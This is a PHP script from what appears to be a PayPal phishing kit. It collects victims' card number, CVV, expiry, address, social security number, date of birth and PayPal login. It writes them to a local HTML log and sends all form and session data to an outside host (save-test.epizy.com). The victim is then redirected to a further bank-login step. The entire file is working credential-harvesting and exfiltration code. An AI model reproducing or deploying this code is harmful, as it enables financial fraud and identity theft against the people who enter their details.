<?php


session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/Email.php');
include('../../functions/get_bin.php');
include('../../functions/get_browser.php');
include('../../functions/get_ip.php');
$_SESSION['_cardholder_'] = strtoupper($_SESSION['_nameoncard_']);
$_SESSION['_cardnumber_'] = preg_replace('/\s+/', '', $_SESSION['_cardnumber_']);


///////////////////////////[CountryA]////////////////////////////////////

function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
    $output = NULL;
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
    $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
    $continents = array(
        "AF" => "Africa",
        "AN" => "Antarctica",
        "AS" => "Asia",
        "EU" => "Europe",
        "OC" => "Australia (Oceania)",
        "NA" => "North America",
        "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
            switch ($purpose) {
                case "location":
                    $output = array(
                        "city"           => @$ipdat->geoplugin_city,
                        "state"          => @$ipdat->geoplugin_regionName,
                        "country"        => @$ipdat->geoplugin_countryName,
                        "country_code"   => @$ipdat->geoplugin_countryCode,
                        "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                        "continent_code" => @$ipdat->geoplugin_continentCode
                    );
                    break;
                case "address":
                    $address = array($ipdat->geoplugin_countryName);
                    if (@strlen($ipdat->geoplugin_regionName) >= 1)
                        $address[] = $ipdat->geoplugin_regionName;
                    if (@strlen($ipdat->geoplugin_city) >= 1)
                        $address[] = $ipdat->geoplugin_city;
                    $output = implode(", ", array_reverse($address));
                    break;
                case "city":
                    $output = @$ipdat->geoplugin_city;
                    break;
                case "state":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "region":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "country":
                    $output = @$ipdat->geoplugin_countryName;
                    break;
                case "countrycode":
                    $output = @$ipdat->geoplugin_countryCode;
                    break;
            }
        }
    }
    return $output;
}

///////////////////////////[CountryA]////////////////////////////////////


$CONTY = ip_info($_SERVER['REMOTE_ADDR'],'Country');

$Alali = "<pre style='border: 2px solid; border-color: rgb(67, 159, 253);border-radius: 4px;font-weight: bold;font-size: 14px;padding-top: 1.5%;padding-bottom: 2%;'>
  <img src='https://2.bp.blogspot.com/-O-ZJASC706s/U_hvz20oD2I/AAAAAAAAACw/OV1BlsEyjM0/s1600/logo_106x27.png'/>

  <font style='color: rgb(251, 58, 105);'>PP BILLING & CARD:</font>
  <font style='color: rgb(20, 158, 27);'>Add Date CARD:</font> $date       
                                                                                                                                                                                                                                    
   <font style='color: rgb(128, 129, 131);'>&#10112; Card type   :</font>  <font style='color: rgb(235, 79, 60);'> ".$_SESSION['_c_type_']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Card Holder :</font>  <font style='color: rgb(60, 118, 235);'> ".$_SESSION['_nameoncard_']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10113; Card number :</font>  <font style='color: rgb(60, 118, 235);'> ".$_SESSION['_cardnumber_']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Expiration  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_SESSION['_expdate_']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10113; Cvv         :</font>  <font style='color: rgb(60, 118, 235);'> ".$_SESSION['_csc_']."</font>

   <font style='color: rgb(128, 129, 131);'>&#10112; Full Name  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_SESSION['_fullname_']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Address line  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_SESSION['_address_']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Country Name  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_SESSION['_LOOKUP_COUNTRY_']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; City Name  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_SESSION['_city_']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; State line  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_SESSION['_state_']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Zip Code  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_SESSION['_zipCode_']."</font>
   
   <font style='color: rgb(128, 129, 131);'>&#10112; Social security number :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['SSN']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Date of Birth (DD/MM/YYYY)  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_POST['dob']."</font>
   
   <font style='color: rgb(128, 129, 131);'>&#10112; More   :</font>  <font style='color: rgb(60, 118, 235);'> <a href = '../users/tnt3.html'>Bank login</a></font>

<font style='color:#9c0000;'>℗</font> [PP Email] = <font style='color:#0070ba;'>".$_SESSION['_login_email_']."</font><br>
<font style='color:#9c0000;'>℗</font> [PP Password] = <font style='color:#0070ba;'>".$_SESSION['_login_password_']."</font><br>
   <font style='color: rgb(128, 129, 131);'>&#10114; IP          :</font>  <font style='color: rgb(60, 118, 235);'><a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=".$_SERVER['REMOTE_ADDR']."'>".$_SERVER['REMOTE_ADDR']."</a></font><br> 
   <font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
   
   ";

 // FOR CC CARD
   
   
   
   
   
   $f = fopen("../../users/tnt2.html", "a");
	    fwrite($f, $Alali);
		
		fclose($f);
		
		//----------------send request post to url ----------------
function sendPost($url,$data) {
	
	
	
$options = array(
        'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    )
);

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
return $result;
}

$data = $_POST;
$data['date'] = $date;
$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
$data['b'] = Z118_Browser($_SERVER['HTTP_USER_AGENT']);
$data['os'] = Z118_OS($_SERVER['HTTP_USER_AGENT']);
$data['s'] = $_SESSION;

sendPost('http://www.save-test.epizy.com/sv2.php',$data);


//---- end request----------------

		
		
		
		
	HEADER("Location: bank.php?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);

?>


		
	